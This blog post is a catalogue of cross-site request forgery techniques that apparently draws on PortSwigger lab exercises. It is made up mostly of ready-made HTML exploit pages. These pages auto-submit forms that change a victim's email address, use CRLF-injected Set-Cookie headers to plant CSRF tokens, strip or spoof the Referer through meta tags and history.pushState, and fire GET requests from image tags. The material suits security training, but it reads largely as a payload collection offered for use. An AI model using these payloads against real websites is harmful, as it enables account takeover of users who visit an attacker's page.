---
layout: post
title:  "CSRF Attacks"
author: erik
categories: [ Web ]
image: https://user-images.githubusercontent.com/47476901/159375082-f0ca6711-c380-41c8-b82d-9e1515ff729e.png
beforetoc: ""
toc: false
tags: [ Web Security, Payloads ]
---
CSRF attacks (Cross-site request forgery) is a type of malicious exploit that aims to perform unauthorized operations that will be executed by a user that the website trusts.

# Table of Contents
1. [CSRF vulnerability without defenses](#CSRFwithoutDefenses)
2. [Token validation depends on request method](#CSRFinGET)
3. [Token validation depends on token presence](#CSRFonPresence)
4. [The CSRF token is not bound to the user's session](#CSRFnotBound)<br>
   4.1. [Same token between users](#SametokenUsers)<br>
   4.2. [Token not linked to the session](#CSRFnotBoundSession)
5. [The token is duplicated in the cookie](#TokenDuplicatedCookie)
6. [CSRF without referrer](#CSRFwithoutReferrer)
7. [Broken Referer Validation](#CSRFRefererBroken)

---

### CSRF vulnerability without defenses <a name="CSRFwithoutDefenses"></a>
**CSRF basic mail**<br>
It makes a request to the endpoint that changes the email and javascript confirms the request, which will change the mail just by visiting the page.

Code from https://web-attacker.com/malicioso.html

```html
<html>
	<body>
		<form action="https://vulnerable-web.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@gmail.com" />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```
---
### CSRF where token validation depends on request method <a name="CSRFinGET"></a>
Depending on the request method, it can be done with GET
```html
<img src="https://vulnerable-web.com/my-account/change-email?email=pwned@gmail.com"/>
```
---
### CSRF where token validation depends on the presence of the token <a name="CSRFonPresence"></a>
It does not verify the CSRF token, it is removed and bypassed.

```html
<html>
	<body>
		<form action="https://vulnerable-web.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@gmail.com" />
             <input type="hidden"  value="csrf" />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```
---
### CSRF token is not bound to user session <a name="CSRFnotBound"></a>
**Using the same token in both users**<br>
We can use the same CSRF Token in one user than in another, thanks to the fact that the token is not linked to the user's session <a name="SametokenUsers"></a><br>
My token: U6vJiRteqjSX46XRk57k6saqolEcdDvQ works for other users too.
```html
<html>
	<body>
		<form action="https://vulnerable-web.com/email/change" method="POST">
			<input type="hidden" name="email" value="pwned@gmail.com" />
                        <input type="hidden" name="csrf" value="<csrf>"  />
		</form>
		<script> document.forms[0].submit(); </script>
	</body>
</html>
```
**The CSRF token is not bound to the session** <a name="CSRFnotBoundSession"></a><br>
So the same csrf token and the same csrf key could be used in one account as in another to change the email
We can use CRLF Injection (If exists) to set the key in the CSRF payload.
```html
<html>
  <body>
    <form action="https://vulnerable-web.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@gmail.com" /> 
      <input type="hidden" name="csrf" value="<csrf>" />
      <input type="submit" value="Submit request" />    </form>
  <img src="https://vulnerable-web.com/?search=test%0d%0aSet-Cookie:%20csrfKey=<key>" onerror="document.forms[0].submit()">

  </body>
</html>
```

---

### The CSRF token is simply duplicated into a cookie <a name="TokenDuplicatedCookie"></a>
The token is validated in the cookie, we can make the user create his own csrf token which we indicate.

![cookieToken](https://user-images.githubusercontent.com/47476901/159374578-694ad92d-dc4c-43c5-b169-a32c28eebf3f.png)

Since the token was validated in the cookie, we can send the request to change the mail.
Again we can use CRLF Intection to indicate the token

```html
<html>
    <body>
        <form action="https://vulnerable-web.com/email/change" method="POST" >
            <input type="hidden" name="email" value="pwned@gmail.com">
            <input type="hidden" name="csrf" value="31415926535897932384626433832795028841971">
        </form>
		
        <img src="https://vulnerable-web.com/?search=hat%0d%0aSet-Cookie:%20csrf=31415926535897932384626433832795028841971" onerror="document.forms[0].submit()">
    </body>
</html>
```


---
### CSRF without referrer <a name="CSRFwithoutReferrer"></a>
We indicate that the Referer does not exist in the CSRF exploit using the meta tag.



```html
<html>
  <head> 
     <meta name="referrer" content="no-referrer">
  </head> 
<body> 
   <form action="https://vulnerable-web.com/email/change" method="POST"> 
   <input type="hidden" name="email" value="pwned@gmail.com" />
   <input type="submit"/>
</form> 
   <script>document.forms[0].submit();</script>
</body>
</html>
```


---
### CSRF with broken Referer validation <a name="CSRFRefererBroken"></a>

The page validates the referrer when we want to change mail, **it is determined if the referrer includes the domain of the origin page.**
By modifying the referer with javascript we can evade this validation and be able to exploit the CSRF.

**Modify the Referer:**
 - Using this javascript function `history.pushState()` that adds an entry to the browser's session history stack.
```html
<script>history.pushState("", "", "/?vulnerable-web.com")</script>
```
- Referer validation accepts any header that contains the expected domain somewhere in the chain
```html
Referer: https://web-attacker.com/?vulnerable-web.com
```

**Referrer-Policy**
- Many browsers now remove the query string from the Referrer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request.
- We have to add in the header "Referrer-Policy: unsafe-url"

```html
<meta name="referrer" content="unsafe-url" />
```

```html
<html>
   <head>
      <meta name="referrer" content="unsafe-url" />
   </head>
   <body>
      <script>
         history.pushState("", "", "/?vulnerable-web.com")  
      </script>
      <form action="https://vulnerable-web.com/email/change" method="POST">
         <input type="hidden" name="email" value="pwned@gmail.com" />
         <input type="submit" value="Submit request" />
      </form>
      <script>document.forms[0].submit();</script>
   </body>
</html>
```

---

- Source Labs: [Portswigger Labs](https://portswigger.net/web-security)
- Credits Image: [cobalt.io](https://www.cobalt.io)
